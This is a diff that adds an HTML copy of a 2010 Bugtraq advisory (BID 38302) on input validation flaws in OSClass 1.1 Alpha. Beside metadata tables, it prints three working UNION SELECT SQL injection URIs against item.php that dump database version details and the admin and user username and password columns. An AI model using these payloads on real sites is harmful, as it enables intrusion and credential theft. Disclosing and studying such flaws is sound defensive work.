@@ -1,0 +1,96 @@
+#SpeeDr00t@Black Falcon<br>#bid38302<p><b><span style="font-size: 18pt;">OSClass Multiple Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/38302/info">info</a><br><a href="http://www.securityfocus.com/bid/38302/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/38302/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/38302/solution">solution</a><br><a href="http://www.securityfocus.com/bid/38302/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				38302
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Feb 18 2010 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Feb 18 2010 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Sioma Labs 
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					OSclass osclass 1.1 Alpha<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x39000/38302/38302.txt">#exploit_38302.txt</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker can exploit these issues via a browser. To exploit a cross-site scripting issue, the attacker must entice an unsuspecting victim to follow a malicious URI.<br/><br/>The following example URIs are available:<br/><br/>http://www.example.com/item.php?id=-1 UNION SELECT 1,2,3,4,5,6,concat_ws(CHAR(32,58,32),user(),database(),version())--<br/><br/>http://www.example.com/item.php?id=-1 UNION SELECT 1,2,3,4,5,6,group_concat(id,0x3a,username,0x3a,password)+from oc_admin--<br/><br/>http://www.example.com/item.php?id=-1 UNION SELECT 1,2,3,4,5,6,group_concat(id,0x3a,username,0x3a,password)+from+oc_user--<br/><br/><br/>The following example data is available:
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/38302.txt">/data/vulnerabilities/exploits/38302.txt</a></li>
+</ul>
+</div>
